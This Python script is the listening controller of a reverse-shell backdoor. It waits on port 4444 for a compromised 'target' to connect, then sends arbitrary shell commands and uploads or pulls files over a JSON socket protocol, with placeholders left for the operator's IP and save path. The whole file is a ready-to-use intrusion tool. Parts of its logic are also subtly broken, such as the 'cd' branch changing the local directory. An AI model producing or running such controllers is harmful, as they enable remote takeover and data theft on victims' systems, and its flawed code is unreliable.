import socket
import json
import os

# Function to send data reliably as JSON-encoded strings
def reliable_send(data, target):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

# Function to receive data reliably as JSON-decoded strings
def reliable_recv(target):
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# Function to upload a file to the server
def upload_file(file_name, target):
    try:
        with open(file_name, 'rb') as f:
            target.sendfile(f)
        reliable_send("File '{}' uploaded successfully.".format(file_name), target)
    except Exception as e:
        reliable_send("Error uploading file '{}': {}".format(file_name, e), target)

# Function to download a file from the server
def download_file(file_name, target):
    try:
        # Specify the directory path where you want to save the downloaded files
        save_path = r'PUT YOUR PATH HERE'
        # Open the file in the specified directory for writing
        with open(os.path.join(save_path, file_name), 'wb') as f:
            while True:
                chunk = target.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        reliable_send("File '{}' downloaded successfully.".format(file_name), target)
    except Exception as e:
        reliable_send("Error downloading file '{}': {}".format(file_name, e), target)

# Function for the main communication loop with the target
def target_communication(target, ip):
    while True:
        # Prompt the user for a command to send to the target.
        command = input('ENTER THE COMMAND HERE : ')
        # Send the user's command to the target using the reliable_send function.
        reliable_send(command, target)
        if command == 'quit':
            # If the user enters 'quit', exit the loop and close the connection.
            break
        elif command == 'clear':
            # If the user enters 'clear', clear the terminal screen.
            os.system('cls' if os.name == 'nt' else 'clear')
        elif command[:3] == 'cd ':
            # If the user enters 'cd', change the current directory on the target.
            try:
                os.chdir(command[3:])
                reliable_send("Directory changed to '{}'".format(os.getcwd()), target)
            except Exception as e:
                reliable_send("Failed to change directory: {}".format(str(e)), target)
        elif command[:8] == 'download':
            # If the user enters 'download', initiate the download of a file from the target.
            download_file(command[9:], target)
        elif command[:6] == 'upload':
            # If the user enters 'upload', initiate the upload of a file to the target.
            upload_file(command[7:], target)
        else:
            # For other commands, receive and print the result from the target.
            result = reliable_recv(target)
            print(result)

# Create a socket for the server
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Specify the IP address and port to bind
ip_address = 'YOUR IP'
port = 4444

# Bind the socket to the specified IP address and port
sock.bind((ip_address, port))

# Start listening for incoming connections (maximum 5 concurrent connections)
print('[+] Listening For Incoming Connections on {}:{}'.format(ip_address, port))
sock.listen(5)

# Accept incoming connection from the target and obtain the target's IP address
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))

# Start the main communication loop with the target
target_communication(target, ip)
